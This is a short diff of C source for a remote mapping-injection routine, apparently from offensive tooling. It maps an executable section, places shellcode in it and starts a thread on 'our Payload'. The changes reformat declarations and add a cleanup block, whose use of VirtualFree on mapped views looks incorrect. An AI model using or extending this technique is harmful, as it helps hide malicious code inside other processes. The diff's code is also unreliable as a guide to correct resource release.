@@ -66,9 +66,10 @@ BOOL RemoteMappingInjection
 
 {
 
-	BOOL State = TRUE;
-	HANDLE hFile = NULL;
-	PVOID LocalAddress, RemoteAddress = NULL;
+	BOOL	State			= TRUE;
+	HANDLE	hFile			= NULL;
+	PVOID	LocalAddress	= NULL,	
+			RemoteAddress	= NULL;
 
 
 	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sSizeofShellcode, NULL);
@@ -114,6 +115,21 @@ BOOL RemoteMappingInjection
 	OKAY("[0x%p] Newly Created Thread Pointing to our Payload!", hThread);
 
 CLEANUP:
+
+	if (RemoteAddress)
+		VirtualFree(RemoteAddress, 0, MEM_RELEASE);
+
+	if (LocalAddress)
+		VirtualFree(LocalAddress, 0, MEM_RELEASE);
+
+	if (hFile)
+		CloseHandle(hFile);
+
+	if (hProcess)
+		CloseHandle(hProcess);
+
+	if (hThread)
+		CloseHandle(hThread);
 
 	return State;
 
